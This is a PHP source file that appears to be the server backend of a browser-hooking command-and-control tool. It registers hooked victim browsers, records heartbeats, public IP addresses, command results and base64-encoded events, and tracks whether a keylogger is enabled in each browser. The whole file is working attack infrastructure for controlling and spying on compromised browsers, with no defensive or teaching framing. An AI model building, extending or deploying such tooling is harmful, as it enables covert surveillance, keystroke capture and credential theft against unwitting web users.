<?php
    require_once('database.php');
    include_once('commands.inc.php'); 
    connectToDatabase();

    function initHook($browserId, $userAgent, $hostname) {

        // Check if browserId
        if(isset($browserId) && !empty($browserId)) {
            // Check if User Agent
            if(!isset($userAgent)) { $userAgent = "N/A"; }            

            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("INSERT INTO hooked_browsers (last_heartbeat, browser_id, user_agent, hostname) VALUES (NOW(3), ?, ?, ?)"))) {
                return;
            }    
            if(!$stmt->bind_param("sss", $browserId, $userAgent, $hostname)) {
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }

            // Keylogger is disabled by default
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("INSERT INTO keylogger_browsers (date, browser_id, keylogger_func) VALUES (NOW(3), ?, 'disabled')"))) {
                return;
            }    
            if(!$stmt->bind_param("s", $browserId)) {
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }
        }
    }

    function heartbeat($browserId) {     
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("UPDATE hooked_browsers SET last_heartbeat = NOW(3) WHERE browser_id = ?"))) {
                return;
            }          
            if (!$stmt->bind_param("s", $browserId)) {
                return;
            }          
            if (!$stmt->execute()) {
                return;
            }
        }   
    }

    function getPublicIP($browserId, $publicIP) {     
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("UPDATE hooked_browsers SET public_ip = ? WHERE browser_id = ?"))) {
                return;
            }          
            if (!$stmt->bind_param("ss", $publicIP, $browserId)) {
                return;
            }          
            if (!$stmt->execute()) {
                return;
            }
        }   
    }

    function addEvent($browserId, $eventType, $b64event) {
        if(isset($browserId) && !empty($browserId)) {
            $event = base64_decode($b64event);

            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("INSERT INTO event_browsers (date, browser_id, event_type, event) VALUES (NOW(3), ?, ?, ?)"))) {
                return;
            }    
            if(!$stmt->bind_param("sss", $browserId, $eventType, $event)) {
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }

            // If event is a command result, stop the command
            if($eventType === "command result") {
                stopCommand($browserId);
            }

            // If event is keylogger enable/disable
            if($eventType === "keylogger (disabled)") {
                keyloggerIsDisabled($browserId, $eventType);
                stopCommand($browserId);
            }

            // If event is keylogger enable/disable
            if($eventType === "keylogger (enabled)") {
                keyloggerIsEnabled($browserId, $eventType);
                stopCommand($browserId);
            }
        }
    }

    function keyloggerIsDisabled($browserId, $eventType) {
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("UPDATE keylogger_browsers SET keylogger_func = 'disabled' WHERE browser_id = ?"))) {
                return;
            }    
            if(!$stmt->bind_param("s", $browserId)) {
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }
        }
    }

    function keyloggerIsEnabled($browserId, $eventType) {
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("UPDATE keylogger_browsers SET keylogger_func = 'enabled' WHERE browser_id = ?"))) {
                return;
            }    
            if(!$stmt->bind_param("s", $browserId)) {
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }
        }
    }
?>